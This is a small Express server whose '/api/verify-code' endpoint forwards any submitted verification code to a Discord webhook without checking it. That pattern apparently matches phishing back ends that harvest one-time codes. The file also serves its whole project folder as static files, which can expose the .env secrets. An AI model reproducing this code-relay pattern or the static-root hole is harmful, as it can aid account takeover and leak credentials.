require('dotenv').config();
const express = require('express');
const path = require('path');

const app = express();

// Middleware to handle JSON and static files
app.use(express.json());
app.use(express.static(__dirname));

app.post('/api/verify-code', async (req, res) => {
  const { code } = req.body;

  try {
    await fetch(process.env.DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `Notification: Verification code received: ${code}`
      })
    });

    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ ok: false, error: 'Failed to send notification' });
  }
});

app.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});
